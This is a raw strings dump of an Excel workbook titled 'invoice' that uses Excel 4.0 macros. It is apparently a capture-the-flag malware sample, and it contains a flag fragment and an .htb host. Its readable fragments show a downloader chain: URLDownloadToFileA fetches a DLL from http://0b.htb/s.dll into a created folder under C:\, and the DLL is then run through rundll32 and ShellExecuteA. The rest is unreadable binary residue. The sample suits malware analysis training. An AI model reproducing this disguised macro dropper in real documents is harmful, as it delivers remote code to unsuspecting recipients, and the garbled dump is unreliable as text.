#CZ
&beI
7 o
og/^
D?D
N\{7Ql9
=M 
}L-3
}$C
M\[H
]Yf
GVv
aW`=@v
xf(
H|n
q7\O
lkZh
M/3
\O/
iG:
gL(
BO}
{!J`4T
Vx:
@2_/
kaQs
b/" 
tMq]{<u
V/B
bqU_
JfI
xqPL
&,Kdy
5_E
MB4
(f2O
j~f0
iV5R
tg1k
jab
0xf?G
@A0
WjK
[m68
.wJ
theme/theme/_rels/themeManager.xml.rels
6?$Q
K(M&$R(.1
QAs
[Content_Types].xmlPK
_rels/.relsPK
theme/theme/themeManager.xmlPK
theme/theme/theme1.xmlPK
theme/theme/_rels/themeManager.xml.relsPK
MbP?_
ffffff
ffffff
Microsoft Print to PDF
Letter
GIS4
DINU"
?]{~
SMTJ
{084F01FA-E634-4D77-83EE-074817C03581}
RESDLL
UniresDLL
PaperSize
LETTER
Orientation
PORTRAIT
Resolution
ResOption1
ColorMode
Color
V4DM
DocumentUserPassword
DocumentOwnerPassword
DocumentCryptSecurity
333333
?333333
http://0b.htb/s.dll
ShellExecuteA
http://0b
00:00:02
rstegerg3B
hTXx.dl
4.0_M4cr0s_r_b4cK}
URLDownloadToFileA
RLM
Xc3l_
c1zB0vasNO
Windows (64-bit) NT 10.00
WindowsD!
00:00:02
agawf23f
Shell32
dll
tp://0
ShellExe
00:00:02
00:00:02
Lsl23Us7a
URLDownl
oadToFileA
LDown
4.0_M
kYKlI\U
Shell
URLDownloadToFileA
6.1D!
A$0!(rR
cuteA
rncwner\
iQhTXx.dll
C:\rncwner\Ck
adToFi
htb/s.
7.0D
Kernel32
CreateDirectoryA
JCJ
C:\rncwner
Kernel32
CreateDirectoryA
JCJ
C:\rncwner\CkkYKlI
0s_r_
JJCCJJ
JJCCCCJ
Open
rundll32.exeD3
URLMON
C:\rncwner\CkuiQhTXx.dll
00:00:02
00:00:02
KsshpqC4Mo
MbP?_
ffffff
ffffff
333333
?333333
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Picture 3
Sheet1g
0xdf
wolf
Microsoft Excel
I}Rb
invoice
c1zB0vasNo
Worksheets
Excel 4.0 Macros
Root Entry
Workbook
SummaryInformation
DocumentSummaryInformation
